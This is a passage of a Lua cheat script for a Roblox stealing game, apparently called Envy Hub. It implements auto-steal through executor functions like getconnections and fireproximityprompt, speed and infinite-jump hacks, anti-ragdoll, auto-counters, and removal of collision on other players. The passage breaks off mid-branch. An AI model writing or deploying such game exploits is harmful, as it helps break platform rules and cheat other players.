local BAT_COUNTER_SLAP_LIST={"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
local function findBatForCounter()
    local c=LP.Character; if not c then return nil end
    local bp=LP:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(BAT_COUNTER_SLAP_LIST) do
        local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name)); if t then return t end
    end
    for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
    if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
    return nil
end
local function swingBatForCounter(bat,char)
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end; task.wait(0.05) end
    local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer() end); task.wait(0.15); pcall(function() remote:FireServer() end)
    else pcall(function() bat:Activate() end); task.wait(0.15); pcall(function() bat:Activate() end) end
end
local function startBatCounter()
    if Conns.batCounter then return end
    Conns.batCounter=RunService.Heartbeat:Connect(function()
        if not State.batCounterEnabled then return end
        if State.batCounterDebounce then return end
        local char=LP.Character; if not char then return end
        local hum2=char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
        local st=hum2:GetState()
        if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
            State.batCounterDebounce=true
            task.spawn(function()
                local bat=findBatForCounter()
                if bat then swingBatForCounter(bat,char) end
                task.wait(0.5); State.batCounterDebounce=false
            end)
        end
    end)
end
local function stopBatCounter()
    if Conns.batCounter then Conns.batCounter:Disconnect(); Conns.batCounter=nil end
    State.batCounterDebounce=false
end

-- ============================================================
-- MEDUSA COUNTER
-- ============================================================
local function findMedusa()
    local c=LP.Character; if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end
    local bp=LP:FindFirstChild("Backpack")
    if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower(); if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end
    return nil
end
local function useMedusaCounter()
    if State.medusaDebounce then return end; if tick()-State.medusaLastUsed<MEDUSA_COOLDOWN then return end
    local c=LP.Character; if not c then return end; State.medusaDebounce=true
    local med=findMedusa(); if not med then State.medusaDebounce=false; return end
    if med.Parent~=c then local hum2=c:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:EquipTool(med) end end
    pcall(function() med:Activate() end); State.medusaLastUsed=tick(); State.medusaDebounce=false
end
local function onAnchorChanged(part) return part:GetPropertyChangedSignal("Anchored"):Connect(function() if part.Anchored and part.Transparency==1 then useMedusaCounter() end end) end
local function setupMedusaCounter(char)
    for _,c2 in pairs(Conns.anchor) do pcall(function() c2:Disconnect() end) end; Conns.anchor={}
    if not char then return end
    for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(Conns.anchor,onAnchorChanged(part)) end end
    table.insert(Conns.anchor,char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(Conns.anchor,onAnchorChanged(part)) end end))
end
local function stopMedusaCounter() for _,c2 in pairs(Conns.anchor) do pcall(function() c2:Disconnect() end) end; Conns.anchor={} end

-- ============================================================
-- AUTO LEFT / RIGHT
-- ============================================================
local function faceSouth() pcall(function() local c=LP.Character; if not c then return end; local root=c:FindFirstChild("HumanoidRootPart"); if root then root.CFrame=CFrame.new(root.Position)*CFrame.Angles(0,0,0) end end) end
local function faceNorth() pcall(function() local c=LP.Character; if not c then return end; local root=c:FindFirstChild("HumanoidRootPart"); if root then root.CFrame=CFrame.new(root.Position)*CFrame.Angles(0,math.rad(180),0) end end) end

local function startAutoLeft()
    if Conns.autoLeft then Conns.autoLeft:Disconnect() end; State.autoLeftPhase=1
    Conns.autoLeft=RunService.Heartbeat:Connect(function()
        if not State.autoLeftEnabled then return end
        local c=LP.Character; if not c then return end
        local root=c:FindFirstChild("HumanoidRootPart"); local hum2=c:FindFirstChildOfClass("Humanoid"); if not root or not hum2 then return end
        local spd=NS
        if State.autoLeftPhase==1 then
            local tgt=Vector3.new(AP.L1.X,root.Position.Y,AP.L1.Z); if (tgt-root.Position).Magnitude<1 then State.autoLeftPhase=2; local d=(AP.L2-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd); return end
            local d=(AP.L1-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd)
        elseif State.autoLeftPhase==2 then
            local tgt=Vector3.new(AP.L2.X,root.Position.Y,AP.L2.Z); if (tgt-root.Position).Magnitude<1 then hum2:Move(Vector3.zero,false); root.AssemblyLinearVelocity=Vector3.zero; State.autoLeftEnabled=false; if Conns.autoLeft then Conns.autoLeft:Disconnect(); Conns.autoLeft=nil end; State.autoLeftPhase=1; if autoLeftSetVisual then autoLeftSetVisual(false) end; faceSouth(); return end
            local d=(AP.L2-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd)
        end
    end)
end
local function stopAutoLeft()
    if Conns.autoLeft then Conns.autoLeft:Disconnect(); Conns.autoLeft=nil end; State.autoLeftPhase=1
    local c=LP.Character; if c then local hum2=c:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:Move(Vector3.zero,false) end end
end
local function startAutoRight()
    if Conns.autoRight then Conns.autoRight:Disconnect() end; State.autoRightPhase=1
    Conns.autoRight=RunService.Heartbeat:Connect(function()
        if not State.autoRightEnabled then return end
        local c=LP.Character; if not c then return end
        local root=c:FindFirstChild("HumanoidRootPart"); local hum2=c:FindFirstChildOfClass("Humanoid"); if not root or not hum2 then return end
        local spd=NS
        if State.autoRightPhase==1 then
            local tgt=Vector3.new(AP.R1.X,root.Position.Y,AP.R1.Z); if (tgt-root.Position).Magnitude<1 then State.autoRightPhase=2; local d=(AP.R2-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd); return end
            local d=(AP.R1-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd)
        elseif State.autoRightPhase==2 then
            local tgt=Vector3.new(AP.R2.X,root.Position.Y,AP.R2.Z); if (tgt-root.Position).Magnitude<1 then hum2:Move(Vector3.zero,false); root.AssemblyLinearVelocity=Vector3.zero; State.autoRightEnabled=false; if Conns.autoRight then Conns.autoRight:Disconnect(); Conns.autoRight=nil end; State.autoRightPhase=1; if autoRightSetVisual then autoRightSetVisual(false) end; faceNorth(); return end
            local d=(AP.R2-root.Position); local mv=Vector3.new(d.X,0,d.Z).Unit; hum2:Move(mv,false); root.AssemblyLinearVelocity=Vector3.new(mv.X*spd,root.AssemblyLinearVelocity.Y,mv.Z*spd)
        end
    end)
end
local function stopAutoRight()
    if Conns.autoRight then Conns.autoRight:Disconnect(); Conns.autoRight=nil end; State.autoRightPhase=1
    local c=LP.Character; if c then local hum2=c:FindFirstChildOfClass("Humanoid"); if hum2 then hum2:Move(Vector3.zero,false) end end
end

-- ============================================================
-- ANTI RAGDOLL
-- ============================================================
-- startAntiRagdoll/stopAntiRagdoll are outer upvalues
startAntiRagdoll=function()
    if Conns.antiRag then return end
    Conns.antiRag=RunService.Heartbeat:Connect(function()
        if not State.antiRagdollEnabled then return end
        local c=LP.Character; if not c then return end
        local hum2=c:FindFirstChildOfClass("Humanoid"); local root=c:FindFirstChild("HumanoidRootPart")
        if not hum2 or not root then return end; if hum2.Health<=0 then return end
        local st=hum2:GetState(); if st==Enum.HumanoidStateType.Dead then return end
        if st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then
            pcall(function() hum2:ChangeState(Enum.HumanoidStateType.GettingUp) end)
            pcall(function() workspace.CurrentCamera.CameraSubject=hum2 end)
            pcall(function() local PM=LP.PlayerScripts:FindFirstChild("PlayerModule"); if PM then local CM=require(PM:FindFirstChild("ControlModule")); if CM then CM:Enable() end end end)
            root.Velocity=Vector3.new(0,0,0); root.RotVelocity=Vector3.new(0,0,0)
        end
        for _,obj in ipairs(c:GetDescendants()) do pcall(function() if obj:IsA("Motor6D") and obj.Enabled==false then obj.Enabled=true end end) end
    end)
end
stopAntiRagdoll=function() if Conns.antiRag then Conns.antiRag:Disconnect(); Conns.antiRag=nil end end

-- ============================================================
-- UNWALK (message 9 improved)
-- ============================================================



-- ============================================================
-- FPS BOOST
-- ============================================================
local applyFPSBoost
applyFPSBoost=function()
    pcall(function() setfpscap(999999999) end)
    local function pO(v) pcall(function()
        if v:IsA("Model") then v.LevelOfDetail=Enum.ModelLevelOfDetail.Disabled; v.ModelStreamingMode=Enum.ModelStreamingMode.Nonatomic
        elseif v:IsA("MeshPart") then v.CastShadow=false; v.DoubleSided=false; v.RenderFidelity=Enum.RenderFidelity.Performance
        elseif v:IsA("BasePart") then v.CastShadow=false; v.Material=Enum.Material.Plastic; v.Reflectance=0
        elseif v:IsA("Decal") or v:IsA("Texture") then v.Transparency=1
        elseif v:IsA("SpecialMesh") then v.TextureId=""
        elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") or v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Beam") then v.Enabled=false
        elseif v:IsA("SurfaceAppearance") or v:IsA("MaterialVariant") then v:Destroy()
        elseif v:IsA("Attachment") then v.Visible=false end
    end) end
    for _,v in pairs(workspace:GetDescendants()) do pO(v) end
    pcall(function()
        local L=game:GetService("Lighting")
        for _,v in pairs(L:GetDescendants()) do pcall(function() if v:IsA("Sky") or v:IsA("Atmosphere") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Clouds") or v:IsA("PostEffect") or v:IsA("ColorCorrectionEffect") then v:Destroy() end end) end
        pcall(function() sethiddenproperty(L,"Technology",Enum.Technology.Legacy) end)
        L.GlobalShadows=false; L.FogEnd=9e9; L.Brightness=0
        local ter=workspace:FindFirstChildOfClass("Terrain")
        if ter then pcall(function() sethiddenproperty(ter,"Decoration",false) end); ter.WaterReflectance=0; ter.WaterTransparency=0.7; ter.WaterWaveSize=0; ter.WaterWaveSpeed=0 end
    end)
    workspace.DescendantAdded:Connect(function(v) if State.fpsBoostEnabled then task.spawn(pO,v) end end)
end

-- ============================================================
-- STEAL
-- ============================================================
-- progressFill is the outer upvalue from the UI progress bar
local stealPctLbl = progressPct  -- alias for the percentage label
local function resetProgressBar()
    if stealPctLbl then stealPctLbl.Text="0%" end
    if progressFill then progressFill.Size=UDim2.new(0,0,1,0) end
end
local function isMyPlotByName(pn)
    local ct=tick(); if Steal.plotCache[pn] and (ct-(Steal.plotCacheTime[pn] or 0))<PLOT_CACHE_DURATION then return Steal.plotCache[pn] end
    local plots=workspace:FindFirstChild("Plots"); if not plots then Steal.plotCache[pn]=false; Steal.plotCacheTime[pn]=ct; return false end
    local plot=plots:FindFirstChild(pn); if not plot then Steal.plotCache[pn]=false; Steal.plotCacheTime[pn]=ct; return false end
    local sign=plot:FindFirstChild("PlotSign"); if sign then local yb=sign:FindFirstChild("YourBase"); if yb and yb:IsA("BillboardGui") then local r=yb.Enabled==true; Steal.plotCache[pn]=r; Steal.plotCacheTime[pn]=ct; return r end end
    Steal.plotCache[pn]=false; Steal.plotCacheTime[pn]=ct; return false
end
local function findNearestPrompt()
    local c=LP.Character; if not c then return nil end; local root=c:FindFirstChild("HumanoidRootPart"); if not root then return nil end
    local ct=tick(); if ct-Steal.promptCacheTime<PROMPT_CACHE_REFRESH and #Steal.cachedPrompts>0 then local np,nd=nil,math.huge; for _,data in ipairs(Steal.cachedPrompts) do if data.spawn then local dist=(data.spawn.Position-root.Position).Magnitude; if dist<=Steal.StealRadius and dist<nd then np=data.prompt; nd=dist end end end; if np then return np end end
    Steal.cachedPrompts={}; Steal.promptCacheTime=ct; local plots=workspace:FindFirstChild("Plots"); if not plots then return nil end; local np,nd=nil,math.huge
    for _,plot in ipairs(plots:GetChildren()) do if isMyPlotByName(plot.Name) then continue end; local pods=plot:FindFirstChild("AnimalPodiums"); if not pods then continue end
        for _,pod in ipairs(pods:GetChildren()) do pcall(function() local base=pod:FindFirstChild("Base"); local sp=base and base:FindFirstChild("Spawn"); if sp then local att=sp:FindFirstChild("PromptAttachment"); if att then for _,child in ipairs(att:GetChildren()) do if child:IsA("ProximityPrompt") then local dist=(sp.Position-root.Position).Magnitude; table.insert(Steal.cachedPrompts,{prompt=child,spawn=sp}); if dist<=Steal.StealRadius and dist<nd then np=child; nd=dist end; break end end end end end) end
    end; return np
end
local function executeSteal(prompt)
    local ct=tick(); if ct-State.lastStealTick<STEAL_COOLDOWN then return end; if State.isStealing then return end
    if not Steal.Data[prompt] then Steal.Data[prompt]={hold={},trigger={},ready=true}; pcall(function() if getconnections then for _,c2 in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do if c2.Function then table.insert(Steal.Data[prompt].hold,c2.Function) end end; for _,c2 in ipairs(getconnections(prompt.Triggered)) do if c2.Function then table.insert(Steal.Data[prompt].trigger,c2.Function) end end else Steal.Data[prompt].useFallback=true end end) end
    local data=Steal.Data[prompt]; if not data.ready then return end; data.ready=false; State.isStealing=true; State.stealStartTime=ct; State.lastStealTick=ct
    if Conns.progress then Conns.progress:Disconnect() end
    Conns.progress=RunService.Heartbeat:Connect(function() if not State.isStealing then Conns.progress:Disconnect(); return end; local prog=math.clamp((tick()-State.stealStartTime)/Steal.StealDuration,0,1); if progressFill then progressFill.Size=UDim2.new(prog,0,1,0) end; if stealPctLbl then stealPctLbl.Text=math.floor(prog*100).."%" end end)
    task.spawn(function()
        local ok=false; pcall(function() if not data.useFallback then for _,fn in ipairs(data.hold) do task.spawn(fn) end; task.wait(Steal.StealDuration); for _,fn in ipairs(data.trigger) do task.spawn(fn) end; ok=true end end)
        if not ok and fireproximityprompt then pcall(function() fireproximityprompt(prompt); ok=true end) end
        if not ok then pcall(function() prompt:InputHoldBegin(); task.wait(Steal.StealDuration); prompt:InputHoldEnd() end) end
        task.wait(Steal.StealDuration*0.3); if Conns.progress then Conns.progress:Disconnect() end; resetProgressBar(); task.wait(0.05); data.ready=true; State.isStealing=false
    end)
end
startAutoSteal=function()
    if Conns.autoSteal then return end
    Conns.autoSteal=RunService.Heartbeat:Connect(function() if not Steal.AutoStealEnabled or State.isStealing then return end; local p=findNearestPrompt(); if p then executeSteal(p) end end)
end
stopAutoSteal=function()
    if Conns.autoSteal then Conns.autoSteal:Disconnect(); Conns.autoSteal=nil end
    State.isStealing=false; State.lastStealTick=0; Steal.plotCache={}; Steal.plotCacheTime={}; Steal.cachedPrompts={}; resetProgressBar()
end

-- ============================================================
-- SAVE / LOAD CONFIG
-- ============================================================
-- saveConfig and loadConfig are outer upvalues - assign directly below
saveConfig=function(btn)
    local function ks(e) return {kb=e.kb and e.kb.Name or nil,gp=e.gp and e.gp.Name or nil} end
    local function sp(f) if not f then return nil end; local p=f.Position; return {xs=p.X.Scale,xo=p.X.Offset,ys=p.Y.Scale,yo=p.Y.Offset} end
    local cfg={
        normalSpeed=NS,carrySpeed=CS,laggerSpeed=LS,laggerCarrySpeed=LS2,
        stealRadius=Steal.StealRadius,
        uiScale=uiScaleValue,
        uiLocked=uiLocked,
        autoLeftKey=ks(KB.AutoLeft),autoRightKey=ks(KB.AutoRight),
        dropKey=ks(KB.Drop),tpDownKey=ks(KB.TPDown),autoBatKey=ks(KB.AutoBat),
        speedKey=ks(KB.Speed),laggerKey=ks(KB.Lagger),guiHideKey=ks(KB.GuiHide),
        infJump=State.infJumpEnabled,
        antiRagdoll=State.antiRagdollEnabled,
        fpsBoost=State.fpsBoostEnabled,
        medusaCounter=State.medusaCounterEnabled,
        batCounter=State.batCounterEnabled,
        autoStealEnabled=Steal.AutoStealEnabled,
        unwalkEnabled=State.unwalkEnabled,
        desyncEnabled=State.desyncEnabled,
        autoSwing=State.autoSwingEnabled,
        autoBatToggled=State.autoBatToggled,
        stretchRez=State.stretchRezEnabled,
        removeAccessories=State.removeAccessoriesEnabled,
        antiLag=State.antiLagEnabled,
        darkMode=State.darkModeEnabled,
        introEnabled=State.introEnabled,
        selectedIntroMusic=State.selectedIntroMusic,
        autoTPDown=autoTPDownEnabled,
        autoTPDownHeight=autoTPDownHeight,
        panelPos=sp(MobilePanel),mainPos=sp(main),miniPos=sp(mini),pbPos=sp(pbFrame),
    }
    local ok,enc=pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and enc then
        local wf = writefile or (syn and syn.writefile) or (getgenv and getgenv().writefile) or _writefile
        if wf then pcall(wf, CONFIG_FILE, enc) end
    end
    if btn then local prev=btn.Text; btn.Text="Saved!"; task.wait(1.5); if btn and btn.Parent then btn.Text=prev end end
end

loadConfig=function()
    local isf = isfile or (syn and syn.isfile) or (getgenv and getgenv().isfile) or _isfile
    local rdf = readfile or (syn and syn.readfile) or (getgenv and getgenv().readfile) or _readfile
    local hasFile=false; pcall(function() hasFile=isf(CONFIG_FILE) end)
    if not hasFile then return end
    local raw; pcall(function() raw=rdf(CONFIG_FILE) end)
    if not raw then return end
    local cfg; pcall(function() cfg=HttpService:JSONDecode(raw) end)
    if not cfg then return end

    if cfg.normalSpeed then NS=cfg.normalSpeed; task.defer(function() if normalBox then normalBox.Text=tostring(NS) end end) end
    if cfg.carrySpeed  then CS=cfg.carrySpeed;  task.defer(function() if carryBox  then carryBox.Text=tostring(CS)  end end) end
    if cfg.laggerSpeed then LS=cfg.laggerSpeed; task.defer(function() if laggerBox then laggerBox.Text=tostring(LS) end end) end
    if cfg.laggerCarrySpeed then LS2=cfg.laggerCarrySpeed; task.defer(function() if laggerBox2 then laggerBox2.Text=tostring(LS2) end end) end
    if cfg.uiScale and type(cfg.uiScale)=="number" then
        uiScaleValue=math.clamp(math.floor(cfg.uiScale+0.5),50,150)
        if mainUIScale then mainUIScale.Scale=uiScaleValue/100 end
        task.defer(function() if uiScaleBox then uiScaleBox.Text=tostring(uiScaleValue) end end)
    end
    if cfg.uiLocked then uiLocked=true; task.defer(function() if setLockUIVisual then setLockUIVisual(true) end end) end
   if cfg.selectedIntroMusic then 
    State.selectedIntroMusic = cfg.selectedIntroMusic 
    task.defer(function() 
        if getgenv().EnvyMusicBtn then 
            getgenv().EnvyMusicBtn.Text = "Music " .. State.selectedIntroMusic 
        end 
    end)
end
if cfg.introEnabled ~= nil then State.introEnabled = cfg.introEnabled; if setIntroToggle then task.defer(function() setIntroToggle(cfg.introEnabled) end) end end
    if cfg.autoTPDown then 
        autoTPDownEnabled=true
        task.defer(function() 
            if setAutoTPDownVisual then setAutoTPDownVisual(true) end
            startAutoTPDown() 
        end) 
    end
    if cfg.autoTPDownHeight and type(cfg.autoTPDownHeight)=="number" then 
        autoTPDownHeight=math.clamp(cfg.autoTPDownHeight,0,500)
        task.defer(function()
            -- Find the TP Down Height input box and update it
            for _, page in pairs(tabPages) do
                for _, child in ipairs(page:GetChildren()) do
                    if child:IsA("Frame") then
                        for _, subchild in ipairs(child:GetChildren()) do
                            if subchild:IsA("TextBox") and subchild.Parent.Name ~= "EnvyHubGUI" then
                                -- Check if this is near a label that says "TP Down Height"
                                for _, label in ipairs(child:GetChildren()) do
                                    if label:IsA("TextLabel") and label.Text == "TP Down Height" then
                                        subchild.Text = tostring(autoTPDownHeight)
                                        break
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
    if cfg.stealRadius or cfg.grabRadius then
        Steal.StealRadius = cfg.stealRadius or cfg.grabRadius
        task.defer(function() if progressRadLbl then progressRadLbl.Text="Radius: "..Steal.StealRadius end end)
    end

    local function lk(e,d) if not d then return end
        if d.kb and Enum.KeyCode[d.kb] then e.kb=Enum.KeyCode[d.kb] end
        if d.gp and Enum.KeyCode[d.gp] then e.gp=Enum.KeyCode[d.gp] end
    end
    lk(KB.AutoLeft,cfg.autoLeftKey); lk(KB.AutoRight,cfg.autoRightKey)
    lk(KB.Drop,cfg.dropKey); lk(KB.TPDown,cfg.tpDownKey); lk(KB.AutoBat,cfg.autoBatKey)
    lk(KB.Speed,cfg.speedKey); lk(KB.Lagger,cfg.laggerKey); lk(KB.GuiHide,cfg.guiHideKey)

    if cfg.infJump           then State.infJumpEnabled=true;           if setInfJump           then setInfJump(true)           end end
    if cfg.antiRagdoll       then State.antiRagdollEnabled=true;       if setAntiRag           then setAntiRag(true)           end; startAntiRagdoll() end
    if cfg.fpsBoost          then State.fpsBoostEnabled=true;          if setFps               then setFps(true)               end; pcall(applyFPSBoost) end
    if cfg.medusaCounter     then State.medusaCounterEnabled=true;     if setMedusaCounter     then setMedusaCounter(true)     end; setupMedusaCounter(LP.Character) end
    if cfg.batCounter        then State.batCounterEnabled=true;        if setBatCounter        then setBatCounter(true)        end; startBatCounter() end
    if cfg.autoStealEnabled  then Steal.AutoStealEnabled=true;         if setAutoGrab          then setAutoGrab(true)          end; pcall(startAutoSteal) end
    if cfg.autoSwing         then State.autoSwingEnabled=true;         if setAutoSwingVisual   then setAutoSwingVisual(true)   end end
    if cfg.unwalkEnabled     then State.unwalkEnabled=true; if setUnwalkToggle then setUnwalkToggle(true) end; startUnwalk() end
    if cfg.stretchRez        then State.stretchRezEnabled=true;        if setStretchRez        then setStretchRez(true)        end end
    if cfg.removeAccessories then State.removeAccessoriesEnabled=true; if setRemoveAccessories then setRemoveAccessories(true) end end
    if cfg.antiLag           then State.antiLagEnabled=true;           if setAntiLag           then setAntiLag(true)           end end
    if cfg.darkMode          then State.darkModeEnabled=true;          if setDarkMode          then setDarkMode(true)          end end
    if cfg.desyncEnabled     then State.desyncEnabled=true; task.defer(function() if setDesync then setDesync(true) end; if saDesync then saDesync(true) end; startDesyncSession() end) end
    if cfg.autoBatToggled    then State.autoBatToggled=true; task.defer(function() if autoBatSetVisual then autoBatSetVisual(true) end; pcall(startBatAimbot) end) end
    -- restore positions after UI is fully built
    task.spawn(function()
        task.wait(0.5)
        local function lp(frame, d) if frame and type(d)=="table" and d.xs~=nil then frame.Position=UDim2.new(d.xs,d.xo,d.ys,d.yo) end end
        lp(main, cfg.mainPos); lp(mini, cfg.miniPos)
        lp(MobilePanel, cfg.panelPos); lp(pbFrame, cfg.pbPos)
    end)
end

-- ============================================================
-- CHARACTER SETUP (message 9 version)
-- ============================================================
-- Speed display for other players
local function setupOtherPlayerBillboard(player)
    if player == LP then return end
    
    local function addBillboard(char)
        task.wait(0.2)
        local head = char:FindFirstChild("Head")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not head or not hrp then return end
        
        local oldBB = head:FindFirstChild("EnvyOtherBB")
        if oldBB then oldBB:Destroy() end
        
        local bb = Instance.new("BillboardGui", head)
        bb.Name = "EnvyOtherBB"
        bb.Size = UDim2.new(0, 100, 0, 30)
        bb.StudsOffset = Vector3.new(0, 3, 0)
        bb.AlwaysOnTop = true
        
        local speedLbl = Instance.new("TextLabel", bb)
        speedLbl.Size = UDim2.new(1, 0, 1, 0)
        speedLbl.BackgroundTransparency = 1
        speedLbl.Text = "0.0"
        speedLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        speedLbl.Font = Enum.Font.GothamBlack
        speedLbl.TextScaled = true
        speedLbl.TextStrokeTransparency = 0
        speedLbl.TextStrokeColor3 = Color3.new(0, 0, 0)
        
        -- Update their speed
        local conn = RunService.RenderStepped:Connect(function()
            if not hrp or not hrp.Parent then 
                conn:Disconnect()
                return 
            end
            local hspd = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z).Magnitude
            speedLbl.Text = string.format("%.1f", hspd)
        end)
    end
    
    player.CharacterAdded:Connect(addBillboard)
    
    if player.Character then
        task.spawn(addBillboard, player.Character)
    end
end

-- Setup for all existing players
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= LP then
        setupOtherPlayerBillboard(player)
    end
end

-- Setup for new players joining
Players.PlayerAdded:Connect(setupOtherPlayerBillboard)

local h,hrp,speedLbl
local function setupChar(char)
    task.wait(0.1)
    h=char:WaitForChild("Humanoid",5)
    hrp=char:WaitForChild("HumanoidRootPart",5)
    if not h or not hrp then return end

    local head=char:FindFirstChild("Head")
    if head then
        local oldBB=head:FindFirstChild("EnvyMobileBB"); if oldBB then oldBB:Destroy() end
        local bb=Instance.new("BillboardGui",head); bb.Name="EnvyMobileBB"
        bb.Size=UDim2.new(0,160,0,52); bb.StudsOffset=Vector3.new(0,3,0); bb.AlwaysOnTop=true
        speedLbl=Instance.new("TextLabel",bb); speedLbl.Name="SpeedBillLbl"
        speedLbl.Size=UDim2.new(1,0,0,24); speedLbl.Position=UDim2.new(0,0,0,0); speedLbl.BackgroundTransparency=1
        speedLbl.Text="0.0"; speedLbl.TextColor3=Color3.fromRGB(255,255,255)
        speedLbl.Font=Enum.Font.GothamBlack; speedLbl.TextScaled=true
        speedLbl.TextStrokeTransparency=0; speedLbl.TextStrokeColor3=Color3.new(0,0,0)
        local discordLbl=Instance.new("TextLabel",bb)
        discordLbl.Size=UDim2.new(1,0,0,28); discordLbl.Position=UDim2.new(0,0,0,26)
        discordLbl.BackgroundTransparency=1; discordLbl.Text="discord.gg/envyhub"
        discordLbl.TextColor3=Color3.fromRGB(255,255,255); discordLbl.Font=Enum.Font.GothamBold
        discordLbl.TextScaled=true; discordLbl.TextStrokeTransparency=0.1
        discordLbl.TextStrokeColor3=Color3.new(0,0,0)
    end

    if State.unwalkEnabled then task.wait(0.3); startUnwalk() end
    stopAntiRagdoll()
    if State.antiRagdollEnabled then task.wait(0.5); startAntiRagdoll() end
    if State.medusaCounterEnabled then setupMedusaCounter(char) end
    if State.autoBatToggled then stopBatAimbot(); task.wait(0.2); pcall(startBatAimbot) end
    if State.batCounterEnabled then task.wait(0.3); startBatCounter() end
    if Steal.AutoStealEnabled then pcall(stopAutoSteal); task.wait(0.5); pcall(startAutoSteal) end
end

LP.CharacterAdded:Connect(setupChar)
if LP.Character then task.spawn(function() setupChar(LP.Character) end) end

-- ============================================================
-- RUNTIME LOOPS
-- ============================================================
RunService.Stepped:Connect(function()
    for _,p in ipairs(Players:GetPlayers()) do
        if p~=LP and p.Character then
            for _,part in ipairs(p.Character:GetChildren()) do if part:IsA("BasePart") then part.CanCollide=false end end
        end
    end
end)

UIS.JumpRequest:Connect(function()
    if not State.infJumpEnabled then return end
    local c=LP.Character; if not c then return end; local root=c:FindFirstChild("HumanoidRootPart")
    if root then root.Velocity=Vector3.new(root.Velocity.X,55,root.Velocity.Z) end
end)

RunService.RenderStepped:Connect(function()
    if not (h and hrp) then return end; if State._tpInProgress then return end
    if not State.autoBatToggled and not State.autoLeftEnabled and not State.autoRightEnabled then
        local md=h.MoveDirection
        local spd=State.laggerToggled and (laggerPhase==2 and LS2 or LS) or (State.speedToggled and CS or NS)
        if md.Magnitude>0 then
            State.lastMoveDir=md; hrp.Velocity=Vector3.new(md.X*spd,hrp.Velocity.Y,md.Z*spd)
        elseif State.antiRagdollEnabled and State.lastMoveDir.Magnitude>0 then
            local anyHeld=false; for key in pairs(MOVE_KEYS) do if UIS:IsKeyDown(key) then anyHeld=true; break end end
            if anyHeld then hrp.Velocity=Vector3.new(State.lastMoveDir.X*spd,hrp.Velocity.Y,State.lastMoveDir.Z*spd) end
        end
    end
    pcall(function()
        if speedLbl then
            local hspd=Vector3.new(hrp.Velocity.X,0,hrp.Velocity.Z).Magnitude
            speedLbl.Text=string.format("%.1f",hspd)
        end
    end)
end)

-- ============================================================
-- INPUT
-- ============================================================
UIS.InputBegan:Connect(function(inp,gp)
    if gp and inp.UserInputType ~= Enum.UserInputType.Gamepad1 then return end
    local kc=inp.KeyCode; if kc==Enum.KeyCode.Unknown then return end
    if kbMatch(KB.Speed,kc) then
        State.laggerToggled = false; laggerPhase = 0
        State.speedToggled = not State.speedToggled
        if mobileLaggerSetActive then mobileLaggerSetActive(false) end
        if modeValLbl then modeValLbl.Text = State.speedToggled and "Carry" or "Normal" end
    elseif kbMatch(KB.AutoLeft,kc) then
        State.autoLeftEnabled=not State.autoLeftEnabled
        if State.autoLeftEnabled and State.autoBatToggled then State.autoBatToggled=false; stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end end
        if State.autoLeftEnabled then startAutoLeft() else stopAutoLeft() end
        if autoLeftSetVisual then autoLeftSetVisual(State.autoLeftEnabled) end
    elseif kbMatch(KB.AutoRight,kc) then
        State.autoRightEnabled=not State.autoRightEnabled
        if State.autoRightEnabled and State.autoBatToggled then State.autoBatToggled=false; stopBatAimbot(); if autoBatSetVisual then autoBatSetVisual(false) end end
        if State.autoRightEnabled then startAutoRight() else stopAutoRight() end
        if autoRightSetVisual then autoRightSetVisual(State.autoRightEnabled) end
    elseif kbMatch(KB.Drop,kc) then
        if not State.dropActive then task.spawn(runDrop) end
    elseif kbMatch(KB.TPDown,kc) then
